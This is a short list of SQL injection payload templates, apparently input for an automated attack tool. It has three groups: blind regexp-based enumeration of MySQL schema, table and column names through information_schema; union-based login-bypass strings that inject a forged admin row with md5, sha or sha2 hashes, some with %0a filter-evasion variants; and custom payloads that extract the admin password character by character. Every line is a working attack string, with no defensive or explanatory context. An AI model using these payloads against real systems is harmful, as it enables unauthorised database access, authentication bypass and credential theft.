blind: ' and 1=0 union select SCHEMA_NAME from information_schema.SCHEMATA where SCHEMA_NAME not in (NOTIN) and SCHEMA_NAME regexp '^{}'#
' and 1=0 union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA not in (NOTIN) and TABLE_NAME regexp '^{}'#
' and 1=0 union select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in (NOTIN) and COLUMN_NAME regexp '^{}'#
' or (select SCHEMA_NAME from information_schema.SCHEMATA where SCHEMA_NAME not in (NOTIN) limit 1) regexp '^{}'#
' or (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA not in (NOTIN) limit 1) regexp '^{}'#
' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in (NOTIN) limit 1) regexp '^{}'#
union: admin' and 9=0 union all select 'admin',md5('admin') from users#
admin' and 9=0 %0a union all select 'admin',md5('admin') from users#
admin' and 9=0 union all select 'admin',sha('admin') from users#
admin' and 9=0 %0a union all select 'admin',sha('admin') from users#
admin' and 9=0 union all select 'admin',sha2('admin') from users#
admin' and 9=0 %0a union all select 'admin',sha2('admin') from users#
admin' and 9=0 union all select 'admin','admin' from users#
custom: admi' or (select password from users where username='admin') regexp '^{}'#
admi') or (select password from users where username='admin') regexp '^{}'#
' or (select username from USERS limit 1) regexp '^{}'#
